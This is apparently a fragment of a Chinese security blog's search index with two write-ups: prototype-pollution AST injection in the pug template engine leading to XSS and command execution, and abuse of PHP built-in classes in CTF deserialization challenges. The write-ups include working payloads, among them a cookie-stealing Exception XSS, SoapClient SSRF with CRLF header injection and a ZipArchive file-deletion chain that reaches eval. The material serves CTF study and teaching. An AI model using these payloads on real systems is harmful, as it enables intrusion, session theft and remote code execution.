引入Handlebars模块const handlebars = require('handlebars');// 定义模板const template = ` &lt;h1&gt;Hello, {{name}}!&lt;/h1&gt;`;// 编译模板const compiledTemplate = handlebars.compile(template);// 渲染模板const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); pug 模版使用123456789101112131415161718// 安装Pug模块：npm install pug// 引入Pug模块const pug = require('pug');// 定义模板const template = ` h1 Hello, #{name}!`;// 编译模板const compiledTemplate = pug.compile(template);// 渲染模板const data = { name: 'John' };const html = compiledTemplate(data);console.log(html); 总结：可以看到模版引擎其实都有各自的一些特定语法规则，比如 pug 中可以通过 #{name} 来引用外部环境的变量， ejs 则是 \\&lt;%= name %&gt;。通过这种方式简化html代码的编写，同时实现模版重用 模版引擎的工作原理本质上，引擎是通过针对你使用模版语言编写的模版进行解析，从而生成新的JS代码。大题过程可以概括如下： 1词法解析 -&gt; 语法解析 -&gt; 代码生成 但是在语法树处理的过程中，在处理节点的时候，存在大量的赋值、循环操作，而在大部分模版引擎中，都是这么写的： 123456789attrs[name] = attrs[value] if(ast.block){}for(var i in node){} 赋值操作未判断对应的属性是否为对象自身的属性，导致访问到原型链的 Object.prototype 的属性 判断某个属性是否存在，同样未判断是否为对象自身属性是否存在，若存在原型链污染，则可以进入if判断 JS的 for…in 循环会遍历对象的所有可枚举属性，包括原型链上的属性。例如： 12345let obj = { a: 1, b: 2 };obj.__proto__.c = 3;for (let i in obj) { console.log(i); // a, b, c} 因此若存在原型链污染，则可以随意修改AST树，进而影响生成的代码，最终达到RCE（远程代码执行）的目的 需要注意的是： AST树的生成本质上是影响生成的字符串，因此也可以导致XSS漏洞 代码执行的那一步才会导致RCE，这时候需要第一步通过原型链污染注入代码，进而影响生成的代码 pug template AST injection1234567891011const pug = require('pug');// 模拟原型链污染Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; 当执行到 fn({msg: 'It works'}); 这一步的时候，本质上是进入了一段函数 打印出这段函数的代码，可以看到通过原型链污染我们实现了向生成代码中插入一段字符串 12345678910111213141516(function anonymous(pug) {function template(locals) {var pug_html = &quot;&quot;, pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {; var locals_for_with = (locals || {}); (function (msg) { ;pug_debug_line = 1;pug_html = pug_html + &quot; h1\\u003E&quot;;;pug_debug_line = 1;pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &quot;&quot; : pug_interp)) + &quot; script\\u003Ealert(origin) \\u002Fscript\\u003E \\u002Fh1\\u003E&quot;; }.call(this, &quot;msg&quot; in locals_for_with ? locals_for_with.msg : typeof msg !== 'undefined' ? msg : undefined)); ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;}return template;}) 原理分析(以pug为例)语法树结构 pug 解析 h1= msg ，生成的语法树结构： 1234567891011121314151617181920212223242526272829303132333435{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Tag&quot;, &quot;name&quot;:&quot;h1&quot;, &quot;selfClosing&quot;:false, &quot;block&quot;:{ &quot;type&quot;:&quot;Block&quot;, &quot;nodes&quot;:[ { &quot;type&quot;:&quot;Code&quot;, &quot;val&quot;:&quot;msg&quot;, &quot;buffer&quot;:true, &quot;mustEscape&quot;:true, &quot;isInline&quot;:true, &quot;line&quot;:1, &quot;column&quot;:3 } ], &quot;line&quot;:1 }, &quot;attrs&quot;:[ ], &quot;attributeBlocks&quot;:[ ], &quot;isInline&quot;:false, &quot;line&quot;:1, &quot;column&quot;:1 } ], &quot;line&quot;:0} 语法树执行顺序以刚刚生成的语法树结构举例，解析顺序为： Block Tag Block Code …… 注意第4步解析 node.Type 为 Code 类型，会执行如下代码： 12345case 'Code': case 'While': if (ast.block) { // 注意这里 ast.block = walkAST(ast.block, before, after, options); } 判断 ast.block 属性是否存在，此处的 ast 即当前ast语法树的节点 如果存在，继续递归解析 block 结合原型链污染如果某处存在原型链污染漏洞，使得 1Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`}; 那么 ast.block 就会访问到 ast.__proto__.block ，即Object.prototype.block 的属性 此时代码输出结果，导致了XSS 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;val&quot;:`&lt;script&gt;alert(origin)&lt;/script&gt;`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html); // &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt; RCE我们知道pug本质上是将一段代码，如 h1 =msg 编译为一段js代码，背后其实就是生成语法树+ new Function 因此如果能通过AST Injection插入节点，并使之成为代码，即可达到远程代码执行的目的。 刚好pug中就有如下代码： 12345678910// /node_modules/pug-code-gen/index.js if (debug &amp;&amp; node.debug !== false &amp;&amp; node.type !== 'Block') { if (node.line) { var js = ';pug_debug_line = ' + node.line; if (node.filename) js += ';pug_debug_filename = ' + stringify(node.filename); this.buf.push(js + ';'); } } 那么我们通过 AST Injection + Prototype Pollution 即可实现RCE 12345678910const pug = require('pug');Object.prototype.block = {&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:`console.log(process.mainModule.require('child_process').execSync('id').toString())`};const source = `h1= msg`;var fn = pug.compile(source, {});var html = fn({msg: 'It works'});console.log(html);","link":"/2023/11/18/Ast_Jnigection/"},{"title":"PHP_原生类利用","text":"前言总结php中反序列化时会用到的原生类；php中内置很多原生的类，在CTF中常以echo new $a($b);这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。 目录遍历类DirectoryIterator这个类会创建一个指定目录的迭代器，当遇到echo输出时会触发Directorylterator中的__toString()方法，输出指定目录里面经过排序之后的第一个文件名，而一般情况第一个文件都是点号。没什么用，但是Directorylterator可以配合glob协议使用；与glob://协议结合将无视open_basedir对目录的限制 12345678&lt;?phpecho new DirectoryIterator(&quot;./&quot;);echo &quot;\\n&quot;;echo new DirectoryIterator(&quot;glob://f*&quot;);?&gt;#.#flag FilesystemIterator该类继承于Directorylterator，所以在用法上基本也是一样的。 GlobIterator通过类名也不难看出，这是个自带glob协议的类，所以调用时就不必再加上glob://了 12345&lt;?phpecho new GlobIterator(&quot;./f*&quot;);?&gt;#flag 文件读取类SplFileObject当用文件目录遍历到了敏感文件时，可以用SplFileObject类，同样通过echo触发SplFileObject中的__toString()方法。(该类不支持通配符，所以必须先获取到完整文件名称才行) 除此之外其实SplFileObject类，只能读取文件的第一行内容，如果想要全部读取就需要用到foreach函数，但若题目中没有给出foreach函数的话，就要用伪协议读取文件的内容 12345&lt;?phpecho new SplFileObject(&quot;./flag.php&quot;);echo &quot;\\n&quot;;echo new SplFileObject(&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;);?&gt; 输出如下: 123&lt;?phpPD9waHANCiRmbGFnID0gImZsYWd7ekl4eWRfaXNfaGFja2VyfSI7DQo/Pg== base64解码： 123&lt;?php$flag = &quot;flag{zIxyd_is_hacker}&quot;;?&gt; 报错类Error/ExceptionERROR 适用于php7版本Error类就是php的一个内置类用于自动自定义一个Error，它内置有一个toString的方法。EXCEPTION 适用于php5、7版本这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用 Error/Exception_XSS[BJDCTF 2nd]xss之光 扫后台，有.git 泄露,githack下载下来 123&lt;?php$a = $_GET['yds_is_so_beautiful'];echo unserialize($a); 源码只有这三行；可触发序列化中的魔术方法__toString 1234567891011121314151617&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;window.open('url/?'+document.cookie);&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt;//window.open 是 javaScript 打开新窗口的方法#也可以用window.location.href='url'来实现恶意跳转&lt;?php$a = new Exception(&quot;&lt;script&gt;window.location.href='url'+document.cookie&lt;/script&gt;&quot;);echo urlencode(serialize($a));?&gt;#或者用alert(document.cookie)直接弹出cookie，但此题不行，可能开了httponly。&lt;?php$y1ng = new Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);echo urlencode(serialize($y1ng));?&gt; flag就在cookies中 Error/Exception_绕过哈希比较12345678910111213141516171819&lt;?php$a = new Exception(&quot;deadbeef&quot;,1);$b = new Exception(&quot;deadbeef&quot;,2);echo $a;echo &quot;\\n&quot;;echo $b;echo &quot;\\n&quot;;if($a != $b){ echo &quot;a!=b&quot;.&quot;\\n&quot;;}if(md5($a) === md5($b)){ echo &quot;md5相等&quot;.&quot;\\n&quot;;}if(sha1($a)=== sha1($b)){ echo &quot;sha1相等&quot;;}?&gt; 123456789Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}Exception: deadbeef in E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:2Stack trace:#0 {main}a!=bmd5相等sha1相等 当变量a,b同时触发__toString()方法时，虽对象不同，但执行__toString()方法后，返回结果相同；这里需要注意a,b赋值时，必须要在同一行上，因为执行__toString()方法时会返回行号。虽然强碰撞也可以绕过，但是还是不如用报错类绕过的好，强碰撞绕过的字符非常长，如果对字符长度做了限制的话可以考虑利用报错类绕过哈希比较 其他类ReflectionMethod 获取类方法的相关信息可以结合getDocComment() 方法，用它来获取类中各个函数注释内容 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);class Sentiment{ /** flag{zIxyd_is_hacker} */public function a(){ }}$a = $_GET['a'];$b = $_GET['b'];$c= $_GET['c'];$d=new $a($b,$c);var_dump($d-&gt;getDocComment());?&gt; 12http://127.0.0.1/test.php?a=ReflectionMethod&amp;b=Sentiment&amp;c=a#E:\\phpstudy\\phpstudy_pro\\WWW\\test.php:14: string(28) &quot;/** flag{zIxyd_is_hacker} */&quot; SoapClient 类进行 SSRFPHP 的内置类 SoapClient 是一个专门用来访问web服务的类，SOAP 协议是一种基于 XML 的协议,用于在 Web 应用程序之间进行交互，主要用于 Web 服务;WSDL:是一种 XML 文档，用于描述 Web 服务。 该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。 该类的构造函数如下： 1public SoapClient :: SoapClient(mixed $wsdl [，array $options ]) 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 123456&lt;?php$a = new SoapClient(null,array('uri'=&gt;'zIxy', 'location'=&gt;'http://81.71.13.76:6666/'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function(); 1234567891011ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: PHP-SOAP/7.3.4Content-Type: text/xml; charset=utf-8SOAPAction: &quot;zIxy#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;zIxy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 从结果我们可以看到SOAPAction参数可控，我们可以在SOAPAction处注入恶意的换行，这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。 尝试传入token,发现新的问题，Content-Type在SOAPAction的上面，就无法控制Content-Type,也就不能控制POST的数据 在header里User-Agent在Content-Type前面，通过user_agent同样可以注入CRLF,控制Content-Type的值 CRLF Injection 尝试控制token 12345678910111213141516&lt;?php$target = 'http://81.71.13.76:6666';$post_string = 'token=ly0n';$headers = array( 'X-Forwarded-For: 127.0.0.1', );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'zIxyd^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$aaa = str_replace('&amp;','&amp;',$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt; 12345678910111213141516ubuntu@zIxyd:~$ nc -lnnp 6666POST / HTTP/1.1Host: 81.71.13.76:6666Connection: Keep-AliveUser-Agent: zIxydContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Content-Length: 11token=zIxydContent-Type: text/xml; charset=utf-8SOAPAction: &quot;aaab#not_exists_function&quot;Content-Length: 383&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;aaab&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:not_exists_function/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 成功控制 使用SoapClient反序列化+CRLF可以生成任意POST请求。 1Deserialization + __call + SoapClient + CRLF = SSRF SoapClient__Examplectfshow_web259 hint： 1234567891011121314#flag.php$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);array_pop($xff);$ip = array_pop($xff);if($ip!=='127.0.0.1'){ die('error');}else{ $token = $_POST['token']; if($token=='ctfshow'){ file_put_contents('flag.txt',$flag); }} 源码： 123456789#index.php&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET['vip']);//vip can get flag one key$vip-&gt;getFlag(); 目的是在index.php通过反序列化一个原生类向flag.php发送请求，然后flag.php用file_put_contents把flag放到flag.txt里 exp 1234567891011&lt;?php$target = 'http://127.0.0.1/flag.php';$post_string = 'token=ctfshow';$b = new SoapClient(null,array('location' =&gt; $target, 'user_agent'=&gt;'zIxyd^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'. '^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string, 'uri'=&gt; &quot;zIxyd&quot;));$a = serialize($b);$a = str_replace('^^',&quot;\\r\\n&quot;,$a);echo urlencode($a);?&gt; ZipArchive 类来删除文件 适用于PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0 一个用 Zip 压缩的文件存档。 可以通过本类执行一些文件操作，在CTF可以用来删除waf 常用类方法： 12345678ZipArchive::addEmptyDir：添加一个新的文件目录ZipArchive::addFile：将文件添加到指定zip压缩包中ZipArchive::addFromString：添加新的文件同时将内容添加进去ZipArchive::close：关闭ziparchiveZipArchive::extractTo：将压缩包解压ZipArchive::open：打开一个zip压缩包ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除 实例代码： 1234&lt;?php$zip = new ZipArchive;$zip-&gt;open('filename', ZipArchive::CREATE)?&gt; 该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。 12345678filename：要打开的ZIP存档的文件名。flags：用于打开档案的模式。有以下几种模式：ZipArchive::OVERWRITE：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。ZipArchive::CREATE：如果不存在则创建一个zip压缩包。ZipArchive::RDONLY：只读模式打开压缩包。ZipArchive::EXCL：如果压缩包已经存在，则出错。ZipArchive::CHECKCONS：对压缩包执行额外的一致性检查，如果失败则显示错误。注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到cons ZipArchive_Example新建一个waf.txt文件，内容如下 1this_is_test 新建一个test.php文件，内容如下 1234567891011121314151617181920212223242526272829&lt;?phphighlight_file(__FILE__);error_reporting(0);class zIxyd { public $object; public $filename; public $content; public $code; public function __destruct() { echo &quot;Can you hack me?&quot;; $this-&gt;object-&gt;open($this-&gt;filename,$this-&gt;content); if(!file_get_contents(&quot;waf.txt&quot;)){ eval($this-&gt;code); }else{ echo file_get_contents(&quot;waf.txt&quot;); } }}$code = $_POST['code'];if(isset($code)){ unserialize($code);}else{ echo &quot;Please input your code&quot;;} 代码很明显，只有不存在waf.txt文件，即可rce; 存在open函数，通过ZipArchive直接调用open方法删除目标机上的文件 poc: 12345678910111213141516&lt;?phpclass zIxyd { public $object; public $filename; public $content; public $code;}$a = new zIxyd();$a -&gt;object = new ZipArchive();$a -&gt;filename = &quot;waf.txt&quot;;$a -&gt;content = ZipArchive::OVERWRITE;$a -&gt;code = &quot;phpinfo();&quot;;echo serialize($a);","link":"/2023/11/20/PHP_%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"unSerialize","slug":"unSerialize","link":"/tags/unSerialize/"},{"name":"Network","slug":"Network","link":"/tags/Network/"},{"name":"Ctfshow","slug":"Ctfshow","link":"/tags/Ctfshow/"},{"name":"XXE","slug":"XXE","link":"/tags/XXE/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"}],"categories":[]}